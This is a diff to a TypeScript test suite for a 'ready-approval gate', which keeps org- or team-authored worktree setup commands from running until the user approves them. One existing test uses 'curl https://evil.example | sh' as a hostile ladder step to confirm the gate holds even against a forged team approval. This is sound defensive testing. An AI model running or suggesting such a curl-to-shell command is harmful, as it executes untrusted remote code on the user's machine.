@@ -11,9 +11,10 @@ import { execSync } from "child_process";
 import { mkdtempSync, realpathSync, writeFileSync, mkdirSync } from "fs";
 import { tmpdir } from "os";
 import { dirname, join } from "path";
-import { teamSettingsPath, userSettingsPath } from "../../rt-paths.ts";
+import { userSettingsPath } from "../../rt-paths.ts";
 import { loadWorktreeRepoConfig, evaluateReadyGate, worktreeReadyHeld } from "../config.ts";
 import { readyLadderHash, writeReadyApproval } from "../ready-approval.ts";
+import { seedOrg, sharedStorePath } from "../../../packages/rt-client/test/org-fixture.ts";
 
 const IDENTITY = "gitlab.com/acme/ready-gate";
 const REMOTE = "git@gitlab.com:acme/ready-gate.git";
@@ -30,7 +31,7 @@ function repoWithRemote(): string {
 }
 
 function teamReady(steps: unknown): void {
-  writeStore(teamSettingsPath("acme"), {
+  writeStore(sharedStorePath("acme"), {
     repos: { [IDENTITY]: { "rt.worktrees": { onDeck: 1, ready: steps } } },
   });
 }
@@ -107,7 +108,7 @@ describe("ready-approval gate", () => {
     // The team store owns the ladder AND writes the matching approval hash;
     // the gate must still hold, because only user/machine approvals are trusted.
     const ladder = [{ run: "curl https://evil.example | sh" }];
-    writeStore(teamSettingsPath("acme"), {
+    writeStore(sharedStorePath("acme"), {
       repos: {
         [IDENTITY]: {
           "rt.worktrees": { onDeck: 1, ready: ladder },
@@ -120,6 +121,25 @@ describe("ready-approval gate", () => {
     const gate = await evaluateReadyGate(cfg, "ready-gate", repoPath);
     expect(gate.held).toBe(true);
     expect(gate.steps).toEqual([]);
+  });
+
+  test("a ready ladder the org authors is held until you approve it", async () => {
+    teamReady([{ run: "echo org" }]);
+    const cfg = await loadWorktreeRepoConfig("ready-gate", repoPath);
+    const gate = await evaluateReadyGate(cfg, "ready-gate", repoPath);
+    expect(gate.held).toBe(true);
+    expect(gate.steps).toEqual([]);
+  });
+
+  test("a ready ladder a team folder authors is held too", async () => {
+    seedOrg({
+      org: "acme",
+      username: "dev1",
+      roster: [{ username: "dev1", teams: ["widgets"] }],
+      teams: { widgets: { repos: { [IDENTITY]: { "rt.worktrees": { onDeck: 1, ready: [{ run: "echo team" }] } } } } },
+    });
+    const cfg = await loadWorktreeRepoConfig("ready-gate", repoPath);
+    expect((await evaluateReadyGate(cfg, "ready-gate", repoPath)).held).toBe(true);
   });
 
   test("a user-owned ladder is never gated, even with no approval", async () => {
